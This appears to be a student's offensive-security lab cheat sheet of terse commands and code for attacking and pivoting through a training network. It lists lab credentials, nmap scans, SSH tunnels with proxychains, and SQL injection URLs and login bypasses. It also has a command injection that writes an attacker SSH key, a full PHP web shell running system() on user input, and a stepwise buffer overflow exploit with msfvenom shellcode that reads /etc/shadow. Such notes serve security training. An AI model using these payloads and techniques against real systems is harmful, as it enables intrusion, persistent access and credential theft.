Starting IP Address : 10.50.x.x -> 192.168.x.x
Credz : user2||EaglesIsARE78  user3||Bob4THEEapples  Lee_Roth||anotherpassword4THEages  Aaron||apasswordyPa$$word  
=======================================================================================================================
>> nmap -Pn -T4 --min-rate 654874654 10.50.x.x -p20-22,2222,4444,4242,80,8080,3389
-- Banner grab to identify the actual services
>> nmap -Pn -T4 --min-rate 156467896 10.50.x.x -p80 --script http-enum.nse
-- sudo apt install nikto
>> nikto -h 10.50.x.x
>> firefox
-- used recon to find initial access
>> whoami && hostname
>> cat /etc/host & passwd
>> sudo -l
>> find / -type f -perm /6000 -ls 2>/dev/null
>> ssh user2@10.50.x.x -D 9050 -NT
>> ssh user2@10.50.x.x -L 51750:192.168.x.x:22 -NT
>> ssh user2@10.50.x.x -L 51751:192.168.x.x:80 -NT
>> proxychains nmap -Pn -T4 --min-rate 654874654 192.168.28.181 -p20-22,2222,4444,4242,80,8080,3389
>> proxychains nmap -Pn -T4 --min-rate 654874654 192.168.28.181 -p80 --script http-enum.nse
-- testing SQL injection : http://127.0.0.1:51751/pick.php?product=7%20or%201=1;#
-- http://127.0.0.1:51751/pick.php?product=7 UNION SELECT table_schema,column_name,table_name from information_schema.columns #
-- http://127.0.0.1:51751/pick.php?product=7 UNION SELECT name,username,user_id from siteusers.columns #
>> for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
-- found 192.168.28.172 and 192.168.28.190
>> proxychains nmap -Pn -T4 --min-rate 654874654 192.168.28.172 -p20-22,2222,4444,4242,80,8080,3389
-- found port 22 open
>> ssh user2@10.50.46.1 -L 51753:192.168.28.172:22 -NT
>> ssh Aaron@127.0.0.1 -p 51753
>> for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
-- found 192.168.28.179
>> xfreerdp Lroth
-- check services
-- check if service is renameable else do dll injection
=======================================================================================================================
      <><><> Examples and References <><><>
=======================================================================================================================
<> ; ls -a
<> ; mkdir /var/www/.ssh
<> generate your own ssh keys
<> ssh-keygen -t rsa -b 4096
<> file id rsa (private key) & file id_rsa.pub (public key)
<> cat id_rsa.pub
<> copy everything in it to file; add "; echo "<key>" > /var/www/.ssh/authorized_keys"; copy whole command and inject it.
<> ssh -i id_rsa www-data@<insert ip>
=======================================================================================================================
http://10.50.35.75/uniondemo.php?Selection=1&Submit=Submit
http://10.50.35.75/uniondemo.php?Selection=2%20or%201=1;
http://10.50.35.75/uniondemo.php?Selection=2 UNION SELECT 1,3,2 #
http://10.50.35.75/uniondemo.php?Selection=2 UNION SELECT 1,3,@@version #
http://10.50.35.75/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns #
=======================================================================================================================
tom' or 1 ='1  ||  username=tom%27+or+1+%3D%271&passwd=tom%27+or+1+%3D%271
Default Databases:  information_schema  |  mysql  |  performance_schema
=======================================================================================================================
<> pip install lxml requests <>
#!/usr/bin/python
import lxml.html
import requests
page = requests.get('http://quotes.toscrape.com/')
tree = lxml.html.fromstring(page.content)
authors = tree.xpath('//small[@class="text"]/text()')
print ('Authors: ',authors)
=======================================================================================================================
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
}
?>
</pre>
</BODY></HTML>
========================================================================================================================
      <<<<< Buffer Overflow >>>>>
Orginal Notes      |      https://github.com/Stephens5824/COSC/blob/Main/Security/Exploit%20Development
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b      :Windows Ex.
-------------------------------------------------------------------------------------------------------------------------
-- find vulnerable function via gdb on lin-Ops
vim lin_buf.py
{
  1 overflow = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7A    c8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag    0Ag1Ag2Ag3Ag4Ag5Ag"
  2 
  3 print(overflow)
}
gdb-peda$ run <<< $(python lin_buf.py)
grab eip and put into register value
{
  1 overflow = "A" *62
  2 eip = "B" *4
  3 print(overflow + eip)
}
gdb-peda$ run <<< $(python lin_buf.py)
show env
-- unset whatever shows up
run
spam A
info proc map
-- grab start under the heap and the end above the stack
find /b <1st start addr under the heap>,<1st end addr above the stack>,0xff,0xe4
{
  1 overflow = "A" *62
  2 eip = "\xef\x59\xf6\xf7" 
  3 '''
  4 0xf7f659ef
  5 0xf7f67203
  6 '''
  7 print(overflow + eip)
}
msfvenom -p linux/x86/exec CMD="cat /etc/shadow" -b '\x00' -f python
{
  1 overflow = "A" *62
  2 eip = "\xef\x59\xf6\xf7"
  3 '''
  4 0xf7f659ef
  5 0xf7f67203
  6 '''
  7 nop = '\x90' *10
  8 buf =  b""
  9 buf += b"\xba\xaa\x8f\x64\x55\xd9\xe5\xd9\x74\x24\xf4\x58"
 10 buf += b"\x2b\xc9\xb1\x0d\x31\x50\x15\x03\x50\x15\x83\xe8"
 11 buf += b"\xfc\xe2\x5f\xe5\x6f\x0d\x06\xa8\x09\xc5\x15\x2e"
 12 buf += b"\x5f\xf2\x0d\x9f\x2c\x95\xcd\xb7\xfd\x07\xa4\x29"
 13 buf += b"\x8b\x2b\x64\x5e\x9b\xab\x88\x9e\xff\xca\xfc\xbe"
 14 buf += b"\xd0\x69\x88\xdd\x01\x01\x18\x43\x3a\x8a\xaf\x83"
 15 buf += b"\x95\x07\xc6\x65\xd4\x28"
 16 print(overflow + eip + nop + buf)
}
run <file> <<< $(python lin_buf.py)
==========================================================================================================================
Linux Kernel
uname -a

rsyslog
/etc/rsyslog.conf

Windows Post-Ex
RUNKEYS!
C:\Users
In explorer:
      top left "File"
      top right "View Hidden Files"

Security Policies
auditpol /get /category:*
#### MUST BE A PRIVILEGED USER ####
#### MUST BE A PRIVILEGED RUNAS FOR CMD ####

C Code
>> << both indicate bit shift
